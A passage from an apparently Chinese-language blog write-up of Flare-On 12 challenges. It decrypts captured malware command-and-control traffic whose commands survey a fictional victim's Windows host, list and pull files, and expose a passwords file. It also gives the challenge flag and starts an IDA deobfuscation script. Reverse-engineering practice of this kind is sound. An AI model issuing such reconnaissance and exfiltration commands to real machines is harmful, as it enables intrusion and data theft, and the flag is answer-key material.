class="line"></span><br><span class="line">h1 = SHA256.new()</span><br><span class="line">h1.update(block160)</span><br><span class="line">A = h1.digest()</span><br><span class="line"></span><br><span class="line">h2 = SHA256.new()</span><br><span class="line">h2.update(block192)</span><br><span class="line">B = h2.digest()</span><br><span class="line"></span><br><span class="line">X = <span class="built_in">bytes</span>(x ^ y <span class="keyword">for</span> x, y <span class="keyword">in</span> <span class="built_in">zip</span>(A, B))</span><br><span class="line">key24 = X[:<span class="number">32</span>]</span><br><span class="line">iv = <span class="built_in">bytes</span>(<span class="built_in">range</span>(<span class="number">16</span>))</span><br><span class="line"></span><br><span class="line">cipher = AES.new(key24, AES.MODE_CBC, iv)</span><br><span class="line">pt = cipher.decrypt(prefix)</span><br><span class="line">pad = pt[-<span class="number">1</span>]</span><br><span class="line">maybe_unpadded = pt</span><br><span class="line"><span class="keyword">if</span> <span class="number">1</span> &lt;= pad &lt;= <span class="number">16</span> <span class="keyword">and</span> pt.endswith(<span class="built_in">bytes</span>([pad])*pad): maybe_unpadded = pt[:-pad]</span><br><span class="line"><span class="built_in">print</span>(pt)</span><br></pre></td></tr></table></figure>

<p>解密消息合集：</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">b&#x27;&#123;&quot;ci&quot;:&quot;Architecture: x64, Cores: 2&quot;,&quot;cn&quot;:&quot;THUNDERNODE&quot;,&quot;hi&quot;:&quot;TheBoss@THUNDERNODE&quot;,&quot;mI&quot;:&quot;6143 MB&quot;,&quot;ov&quot;:&quot;Windows 6.2 (Build 9200)&quot;,&quot;un&quot;:&quot;TheBoss&quot;&#125;\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10&#x27;</span></span><br><span class="line"><span class="string">b&#x27;&#123;&quot;sta&quot;: &quot;ok&quot;&#125;\x03\x03\x03&#x27;</span></span><br><span class="line"><span class="string">b&#x27;&#123;&quot;msg&quot;: &quot;no_op&quot;&#125;\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10&#x27;</span></span><br><span class="line"><span class="string">b&#x27;&#123;&quot;msg&quot;: &quot;cmd&quot;, &quot;d&quot;: &#123;&quot;cid&quot;: 2, &quot;line&quot;: &quot;whoiam&quot;&#125;&#125;\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f&#x27;</span></span><br><span class="line"><span class="string">b&#x27;&#123;&quot;op&quot;:&quot;&quot;&#125;\x07\x07\x07\x07\x07\x07\x07&#x27;</span></span><br><span class="line"><span class="string">b&#x27;&#123;&quot;msg&quot;: &quot;cmd&quot;, &quot;d&quot;: &#123;&quot;cid&quot;: 2, &quot;line&quot;: &quot;whoami&quot;&#125;&#125;\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f&#x27;</span></span><br><span class="line"><span class="string">b&#x27;&#123;&quot;op&quot;:&quot;thundernode\\\\theboss\\n&quot;&#125;\x01&#x27;</span></span><br><span class="line"><span class="string">b&#x27;&#123;&quot;msg&quot;: &quot;cmd&quot;, &quot;d&quot;: &#123;&quot;cid&quot;: 2, &quot;line&quot;: &quot;systeminfo | findstr /B /C:\\&quot;OS Name\\&quot; /C:\\&quot;OS Version\\&quot;&quot;&#125;&#125;\r\r\r\r\r\r\r\r\r\r\r\r\r&#x27;</span></span><br><span class="line"><span class="string">b&#x27;&#123;&quot;op&quot;:&quot;OS Name:                   Microsoft Windows 10 Pro\\nOS Version:                10.0.19045 N/A Build 19045\\n&quot;&#125;\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b&#x27;</span></span><br><span class="line"><span class="string">b&#x27;&#123;&quot;msg&quot;: &quot;cmd&quot;, &quot;d&quot;: &#123;&quot;cid&quot;: 2, &quot;line&quot;: &quot;dir /b C:\\\\Users\\\\%USERNAME%\\\\&quot;&#125;&#125;\x07\x07\x07\x07\x07\x07\x07&#x27;</span></span><br><span class="line"><span class="string">b&#x27;&#123;&quot;op&quot;:&quot;3D Objects\\nContacts\\nDesktop\\nDocuments\\nDownloads\\nFavorites\\nLinks\\nMusic\\nOneDrive\\nPictures\\nSaved Games\\nSearches\\nVideos\\n&quot;&#125;\x06\x06\x06\x06\x06\x06&#x27;</span></span><br><span class="line"><span class="string">b&#x27;&#123;&quot;msg&quot;: &quot;cmd&quot;, &quot;d&quot;: &#123;&quot;cid&quot;: 2, &quot;line&quot;: &quot;arp -a&quot;&#125;&#125;\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f&#x27;</span></span><br><span class="line"><span class="string">b&#x27;&#123;&quot;op&quot;:&quot;\\nInterface: 1.1.1.1 --- 0x1\\n  Internet Address      Physical Address      Type\\n  224.0.0.22                                  static    \\n  224.0.0.251      static    \\n  224.0.0.252                                 static    \\n  239.255.255.250                             static    \\n\\nInterface: 192.168.56.103 --- 0x7\\n  Internet Address      Physical Address      Type\\n  192.168.56.100        08-00-27-ab-e1-14     dynamic   \\n  192.168.56.117        08-00-27-93-a7-cc     dynamic   \\n  192.168.56.255        ff-ff-ff-ff-ff-ff     static    \\n  224.0.0.22            01-00-5e-00-00-16     static    \\n  224.0.0.251           01-00-5e-00-00-fb     static    \\n  224.0.0.252           01-00-5e-00-00-fc     static \\n  239.255.255.250       01-00-5e-7f-ff-fa     static    \\n  255.255.255.255       ff-ff-ff-ff-ff-ff     static    \\n&quot;&#125;\x04\x04\x04\x04&#x27;</span></span><br><span class="line"><span class="string">b&#x27;&#123;&quot;msg&quot;: &quot;cmd&quot;, &quot;d&quot;: &#123;&quot;cid&quot;: 2, &quot;line&quot;: &quot;query user&quot;&#125;&#125;\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b&#x27;</span></span><br><span class="line"><span class="string">b&#x27;&#123;&quot;op&quot;:&quot; USERNAME              SESSIONNAME        ID  STATE   IDLE TIME  LOGON TIME\\n&gt;theboss               console             2  Active      none   8/18/2025 8:30 AM\\n&quot;&#125;\x06\x06\x06\x06\x06\x06&#x27;</span></span><br><span class="line"><span class="string">b&#x27;&#123;&quot;msg&quot;: &quot;cmd&quot;, &quot;d&quot;: &#123;&quot;cid&quot;: 2, &quot;line&quot;: &quot;dir /b C:\\\\Users\\\\%USERNAME%\\\\Desktop&quot;&#125;&#125;\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10&#x27;</span></span><br><span class="line"><span class="string">b&#x27;&#123;&quot;op&quot;:&quot;Google Chrome.lnk\\nLyrics.lnk\\nnotes.txt\\nStudio_Masters_Vault.lnk\\n_DELETED_STUFF\\n&quot;&#125;\x03\x03\x03&#x27;</span></span><br><span class="line"><span class="string">b&#x27;&#123;&quot;msg&quot;: &quot;cmd&quot;, &quot;d&quot;: &#123;&quot;cid&quot;: 2, &quot;line&quot;: &quot;dir /b C:\\\\Users\\\\%USERNAME%\\\\Documents&quot;&#125;&#125;\x0e\x0e\x0e\x0e\x0e\x0e\x0e\x0e\x0e\x0e\x0e\x0e\x0e\x0e&#x27;</span></span><br><span class="line"><span class="string">b&#x27;&#123;&quot;op&quot;:&quot;boss_tech_notes.txt\\nE_Street_Band_Contacts.xlsx\\nLyrics\\nPersonal_Stuff\\nStudio_Masters_Vault\\nSweetScape\\nTour_Rider_2024.docx\\nVisual Studio 2022\\n&quot;&#125;\x01&#x27;</span></span><br><span class="line"><span class="string">b&#x27;&#123;&quot;msg&quot;: &quot;cmd&quot;, &quot;d&quot;: &#123;&quot;cid&quot;: 5, &quot;lp&quot;: &quot;C:\\\\Users\\\\%USERNAME%\\\\Documents\\\\boss_tech_notes.txt&quot;&#125;&#125;\x02\x02&#x27;</span></span><br><span class="line"><span class="string">b&#x27;&#123;&quot;fc&quot;:&quot;&quot;,&quot;sta&quot;:&quot;error cnof&quot;&#125;\x04\x04\x04\x04&#x27;</span></span><br><span class="line"><span class="string">b&#x27;&#123;&quot;msg&quot;: &quot;cmd&quot;, &quot;d&quot;: &#123;&quot;cid&quot;: 5, &quot;lp&quot;: &quot;C:\\\\Users\\\\TheBoss\\\\Documents\\\\boss_tech_notes.txt&quot;&#125;&#125;\x05\x05\x05\x05\x05&#x27;</span></span><br><span class="line"><span class="string">b&#x27;&#123;&quot;fc&quot;:&quot;WWVhaCwgSSBnZXQgaXQuIFNvbWUgZ3V5cywgdGhleSdyZSBoYXBweSBqdXN0IHRvIHR1cm4gdGhlIGtleSBhbmQgZHJpdmUuIEJ1dCB5b3UuLi4geW91IGdvdHRhIHBvcCB0aGUgaG9vZC4gWW91IGdvdHRhIHRyYWNlIHRoZSB3aXJlcywgZmVlbCB0aGUgaGVhdCBjb21pbicgb2ZmIHRoZSBibG9jay4gWW91J3JlIG5vdCBsb29raW5nIHRvIHN0ZWFsIHRoZSBjYXIuLi4geW91J3JlIGp1c3QgdHJ5aW5nIHRvIHVuZGVyc3RhbmQgdGhlIHNvdWwgb2YgdGhlIGVuZ2luZS4gVGhhdCdzIGFuIGhvbmVzdCBuaWdodCdzIHdvcmsgcmlnaHQgdGhlcmUu&quot;,&quot;sta&quot;:&quot;success&quot;&#125;\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b&#x27;</span></span><br></pre></td></tr></table></figure>

<p>base64解密得到：<code>Yeah, I get it. Some guys, they&#39;re happy just to turn the key and drive. But you... you gotta pop the hood. You gotta trace the wires, feel the heat comin&#39; off the block. You&#39;re not looking to steal the car... you&#39;re just trying to understand the soul of the engine. That&#39;s an honest night&#39;s work right there.</code></p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">b&#x27;&#123;&quot;msg&quot;: &quot;cmd&quot;, &quot;d&quot;: &#123;&quot;cid&quot;: 6, &quot;dt&quot;: 20, &quot;np&quot;: &quot;TheBoss@THUNDERNODE&quot;&#125;&#125;\n\n\n\n\n\n\n\n\n\n&#x27;</span></span><br></pre></td></tr></table></figure>

<p>这里改变了block192处的值，变为了<font color=lime><strong>TheBoss@THUNDERNODE06</strong></font>，继续解密：</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">b&#x27;&#123;&quot;msg&quot;: &quot;cmd&quot;, &quot;d&quot;: &#123;&quot;cid&quot;: 2, &quot;line&quot;: &quot;dir /b /s C:\\\\Users\\\\%USERNAME%\\\\Documents\\\\Studio_Masters_Vault\\\\&quot;&#125;&#125;\x03\x03\x03&#x27;</span></span><br><span class="line"><span class="string">b&#x27;&#123;&quot;op&quot;:&quot;C:\\\\Users\\\\TheBoss\\\\Documents\\\\Studio_Masters_Vault\\\\Studio_Masters\\nC:\\\\Users\\\\TheBoss\\\\Documents\\\\Studio_Masters_Vault\\\\The_Vault\\nC:\\\\Users\\\\TheBoss\\\\Documents\\\\Studio_Masters_Vault\\\\Studio_Masters\\\\Live_Bootlegs\\nC:\\\\Users\\\\TheBoss\\\\Documents\\\\Studio_Masters_Vault\\\\Studio_Masters\\\\Released_Albums\\nC:\\\\Users\\\\TheBoss\\\\Documents\\\\Studio_Masters_Vault\\\\Studio_Masters\\\\Live_Bootlegs\\\\Live at the Bottom Line, NYC (1975-08-15)\\nC:\\\\Users\\\\TheBoss\\\\Documents\\\\Studio_Masters_Vault\\\\Studio_Masters\\\\Live_Bootlegs\\\\Winterland Ballroom, San Francisco (1978-12-15)\\nC:\\\\Users\\\\TheBoss\\\\Documents\\\\Studio_Masters_Vault\\\\Studio_Masters\\\\Live_Bootlegs\\\\Live at the Bottom Line, NYC (1975-08-15)\\\\01 - For You.flac\\nC:\\\\Users\\\\TheBoss\\\\Documents\\\\Studio_Masters_Vault\\\\Studio_Masters\\\\Live_Bootlegs\\\\Live at the Bottom Line, NYC (1975-08-15)\\\\02 - Tenth Avenue Freeze-Out.flac\\nC:\\\\Users\\\\TheBoss\\\\Documents\\\\Studio_Masters_Vault\\\\Studio_Masters\\\\Live_Bootlegs\\\\Live at the Bottom Line, NYC (1975-08-15)\\\\03 - She\&#x27;s the One.flac\\nC:\\\\Users\\\\TheBoss\\\\Documents\\\\Studio_Masters_Vault\\\\Studio_Masters\\\\Live_Bootlegs\\\\Winterland Ballroom, San Francisco (1978-12-15)\\\\01 - Good Rockin\&#x27; Tonight.flac\\nC:\\\\Users\\\\TheBoss\\\\Documents\\\\Studio_Masters_Vault\\\\Studio_Masters\\\\Live_Bootlegs\\\\Winterland Ballroom, San Francisco (1978-12-15)\\\\02 - Badlands.flac\\nC:\\\\Users\\\\TheBoss\\\\Documents\\\\Studio_Masters_Vault\\\\Studio_Masters\\\\Live_Bootlegs\\\\Winterland Ballroom, San Francisco (1978-12-15)\\\\03 - Prove It All Night.flac\\nC:\\\\Users\\\\TheBoss\\\\Documents\\\\Studio_Masters_Vault\\\\Studio_Masters\\\\Released_Albums\\\\Born in the U.S.A. (1984)\\nC:\\\\Users\\\\TheBoss\\\\Documents\\\\Studio_Masters_Vault\\\\Studio_Masters\\\\Released_Albums\\\\Born to Run (1975)\\nC:\\\\Users\\\\TheBoss\\\\Documents\\\\Studio_Masters_Vault\\\\Studio_Masters\\\\Released_Albums\\\\Darkness on the Edge of Town (1978)\\nC:\\\\Users\\\\TheBoss\\\\Documents\\\\Studio_Masters_Vault\\\\Studio_Masters\\\\Released_Albums\\\\Greetings from Asbury Park, N.J. (1973)\\nC:\\\\Users\\\\TheBoss\\\\Documents\\\\Studio_Masters_Vault\\\\Studio_Masters\\\\Released_Albums\\\\The River (1980)\\nC:\\\\Users\\\\TheBoss\\\\Documents\\\\Studio_Masters_Vault\\\\Studio_Masters\\\\Released_Albums\\\\Born in the U.S.A. (1984)\\\\01 - Born in the U.S.A..wav\\nC:\\\\Users\\\\TheBoss\\\\Documents\\\\Studio_Masters_Vault\\\\Studio_Masters\\\\Released_Albums\\\\Born in the U.S.A. (1984)\\\\02 - Glory Days.wav\\nC:\\\\Users\\\\TheBoss\\\\Documents\\\\Studio_Masters_Vault\\\\Studio_Masters\\\\Released_Albums\\\\Born in the U.S.A. (1984)\\\\03 - Dancing in the Dark.wav\\nC:\\\\Users\\\\TheBoss\\\\Documents\\\\Studio_Masters_Vault\\\\Studio_Masters\\\\Released_Albums\\\\Born in the U.S.A. (1984)\\\\04 - My Hometown.wav\\nC:\\\\Users\\\\TheBoss\\\\Documents\\\\Studio_Masters_Vault\\\\Studio_Masters\\\\Released_Albums\\\\Born to Run (1975)\\\\01 - Thunder Road.wav\\nC:\\\\Users\\\\TheBoss\\\\Documents\\\\Studio_Masters_Vault\\\\Studio_Masters\\\\Released_Albums\\\\Born to Run (1975)\\\\02 - Tenth Avenue Freeze-Out.wav\\nC:\\\\Users\\\\TheBoss\\\\Documents\\\\Studio_Masters_Vault\\\\Studio_Masters\\\\Released_Albums\\\\Born to Run (1975)\\\\03 - Born to Run.wav\\nC:\\\\Users\\\\TheBoss\\\\Documents\\\\Studio_Masters_Vault\\\\Studio_Masters\\\\Released_Albums\\\\Born to Run (1975)\\\\04 - Jungleland.wav\\nC:\\\\Users\\\\TheBoss\\\\Documents\\\\Studio_Masters_Vault\\\\Studio_Masters\\\\Released_Albums\\\\Darkness on the Edge of Town (1978)\\\\01 - Badlands.wav\\nC:\\\\Users\\\\TheBoss\\\\Documents\\\\Studio_Masters_Vault\\\\Studio_Masters\\\\Released_Albums\\\\Darkness on the Edge of Town (1978)\\\\02 -Racing in the Street.wav\\nC:\\\\Users\\\\TheBoss\\\\Documents\\\\Studio_Masters_Vault\\\\Studio_Masters\\\\Released_Albums\\\\Darkness on the Edge of Town (1978)\\\\03 - The Promised Land.wav\\nC:\\\\Users\\\\TheBoss\\\\Documents\\\\Studio_Masters_Vault\\\\Studio_Masters\\\\Released_Albums\\\\Greetings from Asbury Park, N.J. (1973)\\\\01 - Blinded by the Light.wav\\nC:\\\\Users\\\\TheBoss\\\\Documents\\\\Studio_Masters_Vault\\\\Studio_Masters\\\\Released_Albums\\\\Greetings from Asbury Park, N.J. (1973)\\\\02 - Growin\&#x27; Up.wav\\nC:\\\\Users\\\\TheBoss\\\\Documents\\\\Studio_Masters_Vault\\\\Studio_Masters\\\\Released_Albums\\\\Greetings from Asbury Park, N.J. (1973)\\\\03 - Spirit in the Night.wav\\nC:\\\\Users\\\\TheBoss\\\\Documents\\\\Studio_Masters_Vault\\\\Studio_Masters\\\\Released_Albums\\\\The River (1980)\\\\01 - Hungry Heart.wav\\nC:\\\\Users\\\\TheBoss\\\\Documents\\\\Studio_Masters_Vault\\\\Studio_Masters\\\\Released_Albums\\\\The River (1980)\\\\02 - The River.wav\\nC:\\\\Users\\\\TheBoss\\\\Documents\\\\Studio_Masters_Vault\\\\Studio_Masters\\\\Released_Albums\\\\The River (1980)\\\\03 - Independence Day.wav\\nC:\\\\Users\\\\TheBoss\\\\Documents\\\\Studio_Masters_Vault\\\\The_Vault\\\\Darkness_Acoustic.mp3\\nC:\\\\Users\\\\TheBoss\\\\Documents\\\\Studio_Masters_Vault\\\\The_Vault\\\\rocknroll.zip\\nC:\\\\Users\\\\TheBoss\\\\Documents\\\\Studio_Masters_Vault\\\\The_Vault\\\\The_River_Outtakes.zip\\n&quot;&#125;\n\n\n\n\n\n\n\n\n\n&#x27;</span></span><br><span class="line"><span class="string">b&#x27;&#123;&quot;msg&quot;: &quot;cmd&quot;, &quot;d&quot;: &#123;&quot;cid&quot;: 2, &quot;line&quot;: &quot;dir /b C:\\\\Users\\\\%USERNAME%\\\\Documents\\\\Studio_Masters_Vault\\\\The_Vault&quot;&#125;&#125;\r\r\r\r\r\r\r\r\r\r\r\r\r&#x27;</span></span><br><span class="line"><span class="string">b&#x27;&#123;&quot;op&quot;:&quot;Darkness_Acoustic.mp3\\nrocknroll.zip\\nThe_River_Outtakes.zip\\n&quot;&#125;\t\t\t\t\t\t\t\t\t&#x27;</span></span><br><span class="line"><span class="string">b&#x27;&#123;&quot;msg&quot;: &quot;cmd&quot;, &quot;d&quot;: &#123;&quot;cid&quot;: 5, &quot;lp&quot;: &quot;C:\\\\Users\\\\TheBoss\\\\Documents\\\\Studio_Masters_Vault\\\\The_Vault\\\\rocknroll.zip&quot;&#125;&#125;\n\n\n\n\n\n\n\n\n\n&#x27;</span></span><br></pre></td></tr></table></figure>

<p>在65号对话导出一个zip，其中有flag.jpg但是有加密</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">b&#x27;&#123;&quot;msg&quot;: &quot;cmd&quot;, &quot;d&quot;: &#123;&quot;cid&quot;: 6, &quot;dt&quot;: 25, &quot;np&quot;: &quot;miami&quot;&#125;&#125;\x08\x08\x08\x08\x08\x08\x08\x08&#x27;</span></span><br></pre></td></tr></table></figure>

<p>切换密码到miami</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">b&#x27;&#123;&quot;msg&quot;: &quot;cmd&quot;, &quot;d&quot;: &#123;&quot;cid&quot;: 2, &quot;line&quot;: &quot;dir /b /s C:\\\\Users\\\\%USERNAME%\\\\Documents\\\\Personal_Stuff&quot;&#125;&#125;\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b&#x27;</span></span><br><span class="line"><span class="string">b&#x27;&#123;&quot;op&quot;:&quot;C:\\\\Users\\\\TheBoss\\\\Documents\\\\Personal_Stuff\\\\Financial\\nC:\\\\Users\\\\TheBoss\\\\Documents\\\\Personal_Stuff\\\\passwords.txt\\nC:\\\\Users\\\\TheBoss\\\\Documents\\\\Personal_Stuff\\\\Photos\\nC:\\\\Users\\\\TheBoss\\\\Documents\\\\Personal_Stuff\\\\Financial\\\\tax_info_2023.pdf\\nC:\\\\Users\\\\TheBoss\\\\Documents\\\\Personal_Stuff\\\\Photos\\\\Asbury_Park_sunset.jpg\\nC:\\\\Users\\\\TheBoss\\\\Documents\\\\Personal_Stuff\\\\Photos\\\\old_guitar.jpg\\n&quot;&#125;\x05\x05\x05\x05\x05&#x27;</span></span><br><span class="line"><span class="string">b&#x27;&#123;&quot;msg&quot;: &quot;cmd&quot;, &quot;d&quot;: &#123;&quot;cid&quot;: 6, &quot;dt&quot;: 1, &quot;np&quot;: &quot;miami&quot;&#125;&#125;\t\t\t\t\t\t\t\t\t&#x27;</span></span><br><span class="line"><span class="string">b&#x27;&#123;&quot;msg&quot;: &quot;cmd&quot;, &quot;d&quot;: &#123;&quot;cid&quot;: 5, &quot;lp&quot;: &quot;C:\\\\Users\\\\TheBoss\\\\Documents\\\\Personal_Stuff\\\\passwords.txt&quot;&#125;&#125;\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b&#x27;</span></span><br><span class="line"><span class="string">b&#x27;&#123;&quot;fc&quot;:&quot;RW1haWw6IEJvcm5Ub1J1biE3NQ0KQmFuazogVGhlUml2ZXIjIzE5ODANCkNvbXB1dGVyTG9naW46IFRoZUJvc3NNYW4NCk90aGVyOiBUaGVCaWdNQG4xOTQyIQ0K&quot;,&quot;sta&quot;:&quot;success&quot;&#125;\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b&#x27;</span></span><br><span class="line"><span class="string">b&#x27;&#123;&quot;msg&quot;: &quot;cmd&quot;, &quot;d&quot;: &#123;&quot;cid&quot;: 2, &quot;line&quot;: &quot;echo \\&quot;BRUUUUUUUUUUUUUUUUUUUCCCCCEEEEEEEEEEEEEEEEEEEEEEEEE\\&quot; &gt; C:\\\\Users\\\\%USERNAME%\\\\Desktop\\\\thanks.txt&quot;&#125;&#125;\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c\x0c&#x27;</span></span><br><span class="line"><span class="string">b&#x27;&#123;&quot;msg&quot;: &quot;cmd&quot;, &quot;d&quot;: &#123;&quot;cid&quot;: 3&#125;&#125;\x01&#x27;</span></span><br></pre></td></tr></table></figure>

<p>解密得到：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Email: BornToRun!75</span><br><span class="line">Bank: TheRiver##1980</span><br><span class="line">ComputerLogin: TheBossMan</span><br><span class="line">Other: TheBigM@n1942!</span><br></pre></td></tr></table></figure>

<p>密码是<font color=lime><strong>TheBigM@n1942!</strong></font></p>
<p><img src="/pictures/flareon_12_7.jpg" title="flag07"></p>
<p><font color=deepskyblue><strong>C4N7_ST4R7_A_FLAR3_WITHOUT_4_$<a href="mailto:&#x50;&#x41;&#x52;&#75;&#x40;&#x46;&#x4c;&#x41;&#82;&#x45;&#x2d;&#79;&#x4e;&#x2e;&#99;&#x6f;&#x6d;">PARK@FLARE-ON.com</a></strong></font></p>
<h1 id="8-FlareAuthenticator"><a href="#8-FlareAuthenticator" class="headerlink" title="#8 FlareAuthenticator"></a>#8 FlareAuthenticator</h1><p>程序的11个主要函数存在大量间接跳转，<font color=violet><strong>0x14008F160</strong></font>的位置有一个32768字节的数组，其后不远在<font color=violet><strong>0x140097180</strong></font>有一个36字节的数组，<font color=violet><strong>0x14009773C</strong></font>有一个1573字节的数组，<font color=violet><strong>0x14009C0E0</strong></font>有一个21662大小的间接跳转地址计算表，且导致有大量代码未识别，先编写脚本识别代码：</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> ida_bytes</span><br><span class="line"><span class="keyword">import</span> ida_ua</span><br><span class="line"><span class="keyword">import</span> ida_funcs</span><br><span class="line"><span class="keyword">import</span> ida_ida</span><br><span class="line"></span><br><span class="line">MAX_INSN_SIZE = <span class="number">16</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">force_code_in_range</span>(<span class="params">start_ea, end_ea</span>):</span><br><span class="line">    ea = start_ea</span><br><span class="line">    <span class="keyword">while</span> ea &lt; end_ea:</span><br><span class="line">        flags = ida_bytes.get_flags(ea)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> ida_bytes.is_code(flags):</span><br><span class="line">            ida_bytes.del_items(ea, ida_bytes.DELIT_SIMPLE, MAX_INSN_SIZE)</span><br><span class="line">            <span class="keyword">if</span> ida_ua.create_insn(ea):</span><br><span class="line">                insn = ida_ua.insn_t()</span><br><span class="line">                <span class="keyword">if</span> ida_ua.decode_insn(insn, ea): next_ea = ea + insn.size</span><br><span class="line">                <span class="keyword">else</span>: next_ea = ea + <span class="number">1</span></span><br><span class="line">                ea = next_ea</span><br><span class="line">            <span class="keyword">else</span>: ea += <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            insn = ida_ua.insn_t()</span><br><span class="line">            <span class="keyword">if</span> ida_ua.decode_insn(insn, ea): ea += insn.size</span><br><span class="line">            <span class="keyword">else</span>: ea += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">make_function_in_range</span>(<span class="params">start_ea, size</span>):</span><br><span class="line">    end_ea = start_ea + size</span><br><span class="line">    ida_bytes.del_items(start_ea, ida_bytes.DELIT_SIMPLE, <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> ida_ua.create_insn(start_ea):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Cannot make code at 0x<span class="subst">&#123;start_ea:X&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    func = ida_funcs.get_func(start_ea)</span><br><span class="line">    <span class="keyword">if</span> func:</span><br><span class="line">        ida_funcs.del_func(func)</span><br><span class="line">    <span class="keyword">if</span> ida_funcs.add_func(start_ea, end_ea):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Reload func: 0x<span class="subst">&#123;start_ea:X&#125;</span> - 0x<span class="subst">&#123;end_ea:X&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Cannot make func at 0x<span class="subst">&#123;start_ea:X&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">addrs = [<span class="number">0x140073000</span>, <span class="number">0x140074860</span>, <span class="number">0x140081760</span>, <span class="number">0x14007D290</span>, <span class="number">0x14000D1E0</span>,</span><br><span class="line">         <span class="number">0x14002F8C0</span>, <span class="number">0x140012E50</span>, <span class="number">0x140001DE0</span>, <span class="number">0x1400202B0</span>, <span class="number">0x14005EF60</span>, <span class="number">0x140037160</span>]</span><br><span class="line">sizes = [<span class="number">0xB20</span>, <span class="number">0x19A7</span>, <span class="number">0x23B0</span>, <span class="number">0x2439</span>, <span class="number">0x3D4A</span>,</span><br><span class="line">         <span class="number">0x645A</span>, <span class="number">0x73BE</span>, <span class="number">0xB08C</span>, <span class="number">0xDC63</span>, <span class="number">0x132ED</span>, <span class="number">0x24D6F</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(addrs)):</span><br><span class="line">    start = addrs[i]</span><br><span class="line">    size = sizes[i]</span><br><span class="line">    end = start + size</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Parsing area [<span class="subst">&#123;i&#125;</span>]: 0x<span class="subst">&#123;start:X&#125;</span> - 0x<span class="subst">&#123;end:X&#125;</span> (size=0x<span 